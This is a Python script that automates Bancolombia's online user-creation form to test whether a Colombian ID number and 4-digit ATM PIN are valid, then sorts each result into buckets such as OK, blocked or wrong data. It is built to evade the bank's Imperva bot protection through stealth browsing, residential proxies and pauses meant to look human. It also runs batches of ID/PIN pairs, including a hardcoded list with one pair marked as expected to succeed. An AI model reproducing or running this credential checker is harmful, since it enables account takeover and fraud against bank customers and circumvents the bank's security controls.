"""
Bot Bancolombia: clasifica si una cedula es cliente Bancolombia con clave digital,
basado en el flujo "crear-usuario" que pide cedula + clave del cajero.

Usa Playwright (headless Chromium) con stealth porque Bancolombia esta detras de
Imperva. Necesita IP "limpia" (no marcada como bot) para pasar el WAF:
  - Cloudflare WARP, o
  - VPN residencial, o
  - Proxy residencial.

URL: https://svpersonas.apps.bancolombia.com/crear-usuario/ingresa-tus-datos
Inputs: tipo de documento (CC default), numero documento, clave del cajero (4 digitos)

Buckets:
  - OK                       -> clave correcta y cliente con usuario digital
  - DATOS_INCORRECTOS        -> "Datos incorrectos. Verifica la informacion"
                                (puede ser: cedula no cliente, o clave incorrecta)
  - BLOQUEADO                -> "Tu clave esta bloqueada" / "intentos agotados"
  - SIN_USUARIO              -> cliente pero sin usuario digital creado todavia
  - ERROR_IMPERVA            -> WAF bloqueo la request (cambiar IP)
  - DESCONOCIDO              -> texto no mapeado; queda el screenshot para revisar

Uso:
    python src/bancolombia.py 80009246 1379
    python src/bancolombia.py 79612743 0000 --proxy http://user:pass@host:port
"""
from __future__ import annotations

import argparse
import asyncio
import datetime as dt
import logging
import re
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from playwright.async_api import (
    Browser,
    BrowserContext,
    Page,
    Response,
    TimeoutError as PWTimeoutError,
    async_playwright,
)
from playwright_stealth import Stealth

log = logging.getLogger("bancolombia")

ROOT = Path(__file__).resolve().parent.parent
SHOT_DIR = ROOT / "capture" / "bancolombia" / "shots"
SHOT_DIR.mkdir(parents=True, exist_ok=True)

URL = "https://svpersonas.apps.bancolombia.com/crear-usuario/ingresa-tus-datos"

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
)


# Buckets canonicos
BUCKET_OK = "OK"
BUCKET_DATOS_INCORRECTOS = "DATOS_INCORRECTOS"
BUCKET_BLOQUEADO = "BLOQUEADO"
BUCKET_SIN_USUARIO = "SIN_USUARIO"
BUCKET_ERROR_IMPERVA = "ERROR_IMPERVA"
BUCKET_TIMEOUT = "TIMEOUT"
BUCKET_DESCONOCIDO = "DESCONOCIDO"


@dataclass
class Result:
    cedula: str
    clave: str
    bucket: str
    detail: str = ""
    screenshot: Path | None = None
    raw_responses: list[dict[str, Any]] = field(default_factory=list)
    text_seen: str = ""
    duration_s: float = 0.0


# --- Texto -> bucket -----------------------------------------------------


# orden importa: el primer match gana
_TEXT_RULES: list[tuple[str, re.Pattern[str]]] = [
    (BUCKET_BLOQUEADO,         re.compile(r"bloqueada|bloqueado|intentos agotados|bloqueo de clave|excedido el n[uú]mero de intentos", re.I)),
    (BUCKET_DATOS_INCORRECTOS, re.compile(r"datos incorrectos|verifica la informaci[oó]n", re.I)),
    (BUCKET_SIN_USUARIO,       re.compile(r"no tienes? usuario|todav[ií]a no tienes? usuario|aun no tienes? usuario", re.I)),
    (BUCKET_OK,                re.compile(r"continuar con|completaste|verificaci[oó]n exitosa|valid[oó] correctamente|exitoso", re.I)),
    (BUCKET_ERROR_IMPERVA,     re.compile(r"powered by imperva|access denied|error 15|incident id", re.I)),
]


def classify_text(text: str) -> tuple[str, str]:
    for bucket, pat in _TEXT_RULES:
        m = pat.search(text)
        if m:
            return bucket, m.group(0)
    return BUCKET_DESCONOCIDO, ""


# --- Driver del browser ---------------------------------------------------


async def _setup_context(p, headless: bool, proxy: str | None) -> tuple[Browser, BrowserContext]:
    launch_args: dict[str, Any] = {"headless": headless}
    if proxy:
        launch_args["proxy"] = {"server": proxy}
    browser = await p.chromium.launch(**launch_args)
    context = await browser.new_context(
        viewport={"width": 1280, "height": 800},
        locale="es-CO",
        timezone_id="America/Bogota",
        user_agent=DEFAULT_USER_AGENT,
        extra_http_headers={
            "Accept-Language": "es-CO,es;q=0.9,en;q=0.8",
        },
    )
    stealth = Stealth()
    await stealth.apply_stealth_async(context)
    return browser, context


async def _fill_and_submit(page: Page, cedula: str, clave: str) -> None:
    """Espera al form, llena cedula + clave y aprieta Continuar.

    Bancolombia usa Web Components (bds-input, bds-button, etc), asi que
    probamos varios selectores y fallback a busqueda por texto.
    """
    await page.wait_for_load_state("networkidle", timeout=60_000)

    # Tipo de documento: default CC. Si hay select, lo dejamos.
    # Cedula
    cedula_input = page.locator(
        ", ".join([
            "input[name*='documento' i]",
            "input[placeholder*='documento' i]",
            "input[id*='documento' i]",
            "input[name*='numero' i]",
            "input[type='tel']",
            "input[type='number']",
        ])
    ).first
    await cedula_input.wait_for(state="visible", timeout=30_000)
    await cedula_input.fill(cedula)

    # Clave del cajero
    clave_input = page.locator(
        ", ".join([
            "input[name*='clave' i]",
            "input[placeholder*='clave' i]",
            "input[id*='clave' i]",
            "input[type='password']",
        ])
    ).first
    await clave_input.wait_for(state="visible", timeout=15_000)
    await clave_input.fill(clave)

    # Boton Continuar
    btn = page.get_by_role("button", name=re.compile(r"continuar|continua", re.I)).first
    if not await btn.count():
        btn = page.locator("button:has-text('Continuar')").first
    await btn.wait_for(state="visible", timeout=15_000)
    await btn.click()


async def _wait_for_outcome(page: Page, timeout_ms: int = 30_000) -> str:
    """Espera a que aparezca texto distintivo (error/exito) en la pagina.

    Devuelve el body text completo encontrado.
    """
    # Esperar a que aparezca cualquier indicio de resultado
    deadline = asyncio.get_event_loop().time() + (timeout_ms / 1000)
    last_text = ""
    while asyncio.get_event_loop().time() < deadline:
        await asyncio.sleep(1.0)
        try:
            text = await page.evaluate("() => document.body.innerText || ''")
        except Exception:
            continue
        if not text:
            continue
        last_text = text
        bucket, _ = classify_text(text)
        if bucket != BUCKET_DESCONOCIDO:
            return text
    return last_text


# --- API publica ---------------------------------------------------------


async def classify_async(
    cedula: str,
    clave: str,
    *,
    proxy: str | None = None,
    headless: bool = True,
    keep_browser: tuple[Browser, BrowserContext] | None = None,
    take_screenshot: bool = True,
) -> Result:
    """Clasifica una sola cedula. Retorna Result con bucket y screenshot."""
    started = dt.datetime.utcnow()
    t0 = asyncio.get_event_loop().time()
    raw_responses: list[dict[str, Any]] = []

    async def on_response(resp: Response):
        u = resp.url
        if any(k in u for k in ["/oauth2/token", "/super-svp/", "/svpersonas/"]):
            try:
                raw_responses.append({
                    "url": u,
                    "status": resp.status,
                    "body": (await resp.text())[:2000] if "json" in (resp.headers.get("content-type", "")) else "",
                })
            except Exception:
                pass

    if keep_browser is None:
        async with async_playwright() as p:
            browser, context = await _setup_context(p, headless, proxy)
            page = await context.new_page()
            page.on("response", on_response)
            try:
                return await _do_run(
                    page, cedula, clave, raw_responses, started, t0, take_screenshot
                )
            finally:
                await browser.close()
    else:
        browser, context = keep_browser
        page = await context.new_page()
        page.on("response", on_response)
        try:
            return await _do_run(
                page, cedula, clave, raw_responses, started, t0, take_screenshot
            )
        finally:
            await page.close()


async def _do_run(
    page: Page,
    cedula: str,
    clave: str,
    raw_responses: list[dict[str, Any]],
    started: dt.datetime,
    t0: float,
    take_screenshot: bool,
) -> Result:
    try:
        await page.goto(URL, wait_until="domcontentloaded", timeout=60_000)
    except PWTimeoutError:
        return Result(
            cedula=cedula, clave=clave, bucket=BUCKET_TIMEOUT,
            detail="timeout goto URL",
            duration_s=asyncio.get_event_loop().time() - t0,
        )

    # Detectar Imperva temprano
    body = await page.evaluate("() => document.body.innerText || ''")
    bucket, m = classify_text(body)
    if bucket == BUCKET_ERROR_IMPERVA:
        shot = SHOT_DIR / f"{started:%Y%m%d_%H%M%S}_{cedula}_imperva.png" if take_screenshot else None
        if shot:
            await page.screenshot(path=str(shot), full_page=True)
        return Result(
            cedula=cedula, clave=clave, bucket=bucket, detail=m,
            screenshot=shot, text_seen=body[:500],
            raw_responses=raw_responses,
            duration_s=asyncio.get_event_loop().time() - t0,
        )

    # Llenar y enviar
    try:
        await _fill_and_submit(page, cedula, clave)
    except PWTimeoutError as e:
        shot = SHOT_DIR / f"{started:%Y%m%d_%H%M%S}_{cedula}_form_timeout.png" if take_screenshot else None
        if shot:
            await page.screenshot(path=str(shot), full_page=True)
        return Result(
            cedula=cedula, clave=clave, bucket=BUCKET_TIMEOUT,
            detail=f"no encontre selector del form: {e}",
            screenshot=shot, text_seen=body[:500],
            raw_responses=raw_responses,
            duration_s=asyncio.get_event_loop().time() - t0,
        )

    # Esperar respuesta
    final_text = await _wait_for_outcome(page)
    bucket, m = classify_text(final_text)
    shot = (
        SHOT_DIR / f"{started:%Y%m%d_%H%M%S}_{cedula}_{bucket.lower()}.png"
        if take_screenshot else None
    )
    if shot:
        await page.screenshot(path=str(shot), full_page=True)
    return Result(
        cedula=cedula, clave=clave, bucket=bucket, detail=m,
        screenshot=shot, text_seen=final_text[:500],
        raw_responses=raw_responses,
        duration_s=asyncio.get_event_loop().time() - t0,
    )


def classify_sync(cedula: str, clave: str, **kwargs) -> Result:
    """Wrapper sincronico para usar desde el worker async existente via executor."""
    return asyncio.run(classify_async(cedula, clave, **kwargs))


# --- CLI ------------------------------------------------------------------


async def _batch(cedulas_y_claves: list[tuple[str, str]], headless: bool, proxy: str | None) -> list[Result]:
    """Procesa varias en una sola sesion del browser para no rebuildear contexto."""
    async with async_playwright() as p:
        browser, context = await _setup_context(p, headless, proxy)
        results: list[Result] = []
        try:
            for cedula, clave in cedulas_y_claves:
                print(f"\n[*] {cedula} / {clave}")
                r = await classify_async(
                    cedula, clave,
                    proxy=proxy, headless=headless,
                    keep_browser=(browser, context),
                )
                results.append(r)
                _print_result(r)
                # pausa entre intentos para no parecer bot
                await asyncio.sleep(2.5)
        finally:
            await browser.close()
    return results


def _print_result(r: Result) -> None:
    print(f"    bucket   = {r.bucket}")
    if r.detail:
        print(f"    match    = {r.detail!r}")
    if r.screenshot:
        print(f"    shot     = {r.screenshot}")
    print(f"    duration = {r.duration_s:.1f}s")


def main() -> None:
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)-7s %(name)s :: %(message)s")
    ap = argparse.ArgumentParser()
    ap.add_argument("cedula", nargs="?")
    ap.add_argument("clave", nargs="?")
    ap.add_argument("--batch", action="store_true", help="usar lista predefinida de prueba")
    ap.add_argument("--proxy", default=None, help='ej. "http://user:pass@host:port"')
    ap.add_argument("--no-headless", action="store_true")
    args = ap.parse_args()

    headless = not args.no_headless
    if args.batch:
        casos = [
            ("79612743", "0000"),    # esperado: SIN_USUARIO o DATOS_INCORRECTOS
            ("1030648205", "2872"),  # esperado: BLOQUEADO o DATOS_INCORRECTOS
            ("80009246", "1379"),    # esperado: OK
        ]
        asyncio.run(_batch(casos, headless, args.proxy))
    else:
        if not args.cedula or not args.clave:
            ap.error("dame cedula + clave, o usa --batch")
        r = asyncio.run(classify_async(args.cedula, args.clave, proxy=args.proxy, headless=headless))
        _print_result(r)


if __name__ == "__main__":
    main()
